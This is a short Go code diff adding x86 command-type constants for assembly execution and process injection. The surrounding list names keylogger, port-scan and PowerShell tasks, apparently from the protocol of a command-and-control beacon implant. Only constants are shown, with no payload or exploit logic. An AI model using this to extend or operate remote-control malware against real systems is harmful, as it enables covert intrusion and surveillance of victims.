@@ -89,10 +89,13 @@ const (
 	CMD_TYPE_PORTSCAN_X64               = 90
 	CMD_TYPE_KEYLOGGER                  = 101
 	CMD_TYPE_EXECUTE_ASSEMBLY_X64       = 88
+	CMD_TYPE_EXECUTE_ASSEMBLY_X86       = 87
 	CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X64 = 71
+	CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X86 = 70
 	CMD_TYPE_IMPORT_POWERSHELL          = 37
 	CMD_TYPE_POWERSHELL_PORT            = 79
 	CMD_TYPE_INJECT_X64                 = 43
+	CMD_TYPE_INJECT_X86                 = 9
 )
 
 func ParseCommandShell(b []byte) (string, []byte, error) {
